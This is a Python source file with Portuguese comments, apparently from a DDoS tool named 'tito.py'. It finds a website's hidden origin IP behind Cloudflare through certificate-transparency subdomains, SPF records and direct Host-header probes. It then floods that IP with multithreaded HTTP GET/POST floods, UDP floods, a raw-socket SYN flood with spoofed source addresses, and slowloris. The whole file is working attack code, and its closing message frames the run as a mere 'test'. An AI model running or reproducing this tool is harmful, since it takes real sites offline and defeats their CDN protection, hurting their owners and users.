# ---------------- contadores ----------------
def rand_bytes(n):
    try:
        return random.randbytes(n)
    except AttributeError:
        return os.urandom(n)


def bump(n=1, fail=False):
    global COUNTER, FAILS
    with LOCK:
        COUNTER += n
        if fail:
            FAILS += 1


def stats_printer(duration):
    start = time.time()
    last = start
    last_count = 0
    while not STOP.is_set():
        time.sleep(2)
        now = time.time()
        with LOCK:
            c, f = COUNTER, FAILS
        rps = (c - last_count) / (now - last) if now > last else 0
        last, last_count = now, c
        print("  [*] %6.1fs | enviados: %d | falhas: %d | ritmo: %,.0f/s" % (now - start, c, f, rps))
    with LOCK:
        c, f = COUNTER, FAILS
    print("\n[*] TOTAL: %d requisicoes/pacotes, %d falhas em %ds" % (c, f, duration))


# ---------------- bypass Cloudflare ----------------
def fetch_cf_ranges():
    global CF_RANGES
    try:
        req = urllib.request.Request("https://www.cloudflare.com/ips-v4", headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=15) as r:
            lines = [l.strip() for l in r.read().decode().splitlines() if l.strip()]
        if lines:
            CF_RANGES = lines
    except Exception:
        pass


def is_cloudflare(ip):
    try:
        a = ipaddress.ip_address(ip)
        for cidr in CF_RANGES:
            if a in ipaddress.ip_network(cidr):
                return True
    except ValueError:
        pass
    return False


def crt_sh_subdomains(domain):
    """Subdominios expostos em certificados publicos (transparencia)."""
    q = quote("%." + domain)
    url = "https://crt.sh/?q=%s&output=json" % q
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=30) as r:
        data = json.loads(r.read().decode("utf-8", "replace"))
    names = set()
    for entry in data:
        for n in str(entry.get("name_value", "")).split("\n"):
            n = n.strip().lower()
            if n and "*" not in n and (n == domain or n.endswith("." + domain)):
                names.add(n)
    names.add(domain)
    names.add("www." + domain)
    return names


def spf_ips(domain):
    """IPs vazados no registro TXT/SPF (ex.: servidor de email no mesmo host)."""
    ips = set()
    cmds = [["nslookup", "-type=TXT", domain], ["dig", "+short", "TXT", domain]]
    for cmd in cmds:
        try:
            out = subprocess.run(cmd, capture_output=True, text=True, timeout=15).stdout
            if out:
                for m in re.finditer(r"ip4:([\d.]+)", out):
                    ips.add(m.group(1))
                break
        except Exception:
            continue
    return ips


def probe_origin(ip, domain):
    """Confirma origin: responde com Host header correto na porta 80/443."""
    for port in (443, 80):
        try:
            s = socket.create_connection((ip, port), timeout=6)
            if port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=domain)
            s.sendall(("GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n" % domain).encode())
            resp = s.recv(2048)
            s.close()
            line = resp.split(b"\r\n", 1)[0].decode(errors="replace")
            if line.startswith("HTTP/"):
                return line
        except Exception:
            continue
    return None


def discover(domain):
    print("\n[*] Descobrindo IP real de %s (bypass Cloudflare)..." % domain)
    fetch_cf_ranges()

    try:
        pub = socket.gethostbyname(domain)
        print("[*] IP publico: %s -> %s" % (domain, pub))
        print("    (%s)" % ("e da Cloudflare - origin escondido, vamos achar" if is_cloudflare(pub) else "NAO e da Cloudflare - pode ser o origin direto"))
    except Exception as e:
        print("[!] DNS publico falhou: %s" % e)

    subs = set()
    try:
        subs = crt_sh_subdomains(domain)
        print("[*] crt.sh: %d subdominios/certificados encontrados." % len(subs))
    except Exception as e:
        print("[!] crt.sh indisponivel: %s" % e)

    cands = {}
    for name in sorted(subs)[:150]:
        try:
            for ip in socket.gethostbyname_ex(name)[2]:
                if not is_cloudflare(ip):
                    cands.setdefault(ip, set()).add(name)
        except Exception:
            pass

    for ip in spf_ips(domain):
        if not is_cloudflare(ip):
            cands.setdefault(ip, set()).add("(SPF/MX)")

    print("\n[*] Candidatos fora da Cloudflare (testando direto com Host header):")
    origins = []
    for ip, names in sorted(cands.items(), key=lambda x: -len(x[1])):
        line = probe_origin(ip, domain)
        status = line or "sem resposta"
        flag = "  <-- ORIGIN CONFIRMADO" if line else ""
        print("    %-16s %-18s %s%s" % (ip, status, ",".join(sorted(names)[:3]), flag))
        if line:
            origins.append(ip)

    if not origins:
        print("\n[!] Nenhum origin confirmado. Origem pode estar so em IP v6, atras de outro CDN,")
        print("    ou totalmente escondida. Tente tambem: historico de DNS (SecurityTrails/ViewDNS),")
        print("    shodan.io (favicon hash) e emails do dominio (cabecalhos completos).")
    return origins


# ---------------- vetores ----------------
def http_flood(ip, port, host_header, path, method, use_ssl, bot_id):
    ctx = None
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    while not STOP.is_set():
        try:
            sock = socket.create_connection((ip, port), timeout=5)
            if ctx:
                sock = ctx.wrap_socket(sock, server_hostname=host_header)
            headers = "Host: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n" % (host_header, random.choice(USER_AGENTS))
            body = ""
            if method == "POST":
                body = "x=" + rand_bytes(64).hex()
                headers += "Content-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n" % len(body)
            req = ("%s %s HTTP/1.1\r\n%sConnection: keep-alive\r\n\r\n%s" % (method, path, headers, body)).encode()
            sock.sendall(req)
            try:
                sock.recv(1024)
            except Exception:
                pass
            sock.close()
            bump()
        except Exception:
            bump(fail=True)


def udp_flood(ip, port, bot_id):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = rand_bytes(1400)
    while not STOP.is_set():
        try:
            sock.sendto(payload, (ip, port))
            bump()
        except Exception:
            bump(fail=True)


def csum(data):
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF


def syn_flood(ip, port, bot_id):
    try:
        raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        raw.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except (PermissionError, OSError):
        print("[!] SYN flood NAO funciona no Windows via Python. Use 'udp' ou 'http-get'.")
        return
    dst_bin = socket.inet_aton(ip)
    while not STOP.is_set():
        src_ip = socket.inet_aton("%d.%d.%d.%d" % tuple(random.randint(1, 254) for _ in range(4)))
        src_port = random.randint(1024, 65535)
        seq = random.randint(0, 0xFFFFFFFF)
        tcp = struct.pack("!HHLLBBHHH", src_port, port, seq, 0, 5 << 4, 2, 1024, 0, 0)
        pseudo = dst_bin + src_ip + struct.pack("!BBH", 0, socket.IPPROTO_TCP, len(tcp))
        tcp = struct.pack("!HHLLBBHHH", src_port, port, seq, 0, 5 << 4, 2, 1024, csum(pseudo + tcp), 0)
        total = 20 + len(tcp)
        ip_h = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, random.randint(0, 65535),
                           0, 64, socket.IPPROTO_TCP, 0, src_ip, dst_bin)
        ip_h = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total, random.randint(0, 65535),
                           0, 64, socket.IPPROTO_TCP, csum(ip_h), src_ip, dst_bin)
        try:
            raw.sendto(ip_h + tcp, (ip, port))
            bump()
        except Exception:
            bump(fail=True)


def slowloris(ip, port, host_header, path, bot_id):
    conns = []
    while not STOP.is_set():
        try:
            if len(conns) < 150:
                s = socket.create_connection((ip, port), timeout=10)
                s.sendall(("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n"
                           % (path, host_header, random.choice(USER_AGENTS))).encode())
                conns.append(s)
                bump()
            for c in conns[:]:
                try:
                    c.sendall(b"X-a: %d\r\n" % random.randint(1, 9999))
                    bump()
                except Exception:
                    conns.remove(c)
                    bump(fail=True)
        except Exception:
            bump(fail=True)
        time.sleep(10)
    for c in conns:
        try:
            c.close()
        except Exception:
            pass


# ---------------- motor ----------------
def run_attack(url, bots, vector, duration, port=0, ip_override=None):
    parsed = urlparse(url if "://" in url else "http://" + url)
    host = parsed.hostname
    if not host:
        print("[!] URL invalida.")
        return
    port = port or parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    use_ssl = parsed.scheme == "https"

    try:
        target_ip = ip_override or socket.gethostbyname(host)
    except socket.gaierror as e:
        print("[!] DNS falhou para %s: %s" % (host, e))
        return

    print("\n[*] Alvo IP: %s:%d | Host header: %s" % (target_ip, port, host))
    print("[*] Vetor: %s | Bots: %d | Duracao: %ds\n" % (vector, bots, duration))

    STOP.clear()
    workers = []
    for i in range(bots):
        if vector == "http-get":
            t = threading.Thread(target=http_flood, args=(target_ip, port, host, path, "GET", use_ssl, i), daemon=True)
        elif vector == "http-post":
            t = threading.Thread(target=http_flood, args=(target_ip, port, host, path, "POST", use_ssl, i), daemon=True)
        elif vector == "udp":
            t = threading.Thread(target=udp_flood, args=(target_ip, port, i), daemon=True)
        elif vector == "syn":
            t = threading.Thread(target=syn_flood, args=(target_ip, port, i), daemon=True)
        else:
            t = threading.Thread(target=slowloris, args=(target_ip, port, host, path, i), daemon=True)
        workers.append(t)
        t.start()

    stat = threading.Thread(target=stats_printer, args=(duration,), daemon=True)
    stat.start()

    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print("\n[!] Interrompido pelo usuario.")
    finally:
        STOP.set()
        for w in workers:
            w.join(timeout=2)
        stat.join(timeout=2)
    print("[*] Teste finalizado.\n")


def bypass_and_attack(url, bots, vector, duration, port=0):
    parsed = urlparse(url if "://" in url else "http://" + url)
    domain = parsed.hostname
    if not domain:
        print("[!] URL invalida.")
        return
    origins = discover(domain)
    if not origins:
        print("\n[!] Nenhum origin confirmado. Atacando o IP publico (efeito limitado).")
        run_attack(url, bots, vector, duration, port)
        return
    print("\n[*] Origins confirmados: %s" % ", ".join(origins))
    run_attack(url, bots, vector, duration, port, ip_override=origins[0])
    if len(origins) > 1:
        print("[*] Outros origins (ataque manual com --ip):")
        for ip in origins[1:]:
            print("    python tito.py --url %s --ip %s --bots %d --vector %s --time %d" % (url, ip, bots, vector, duration))


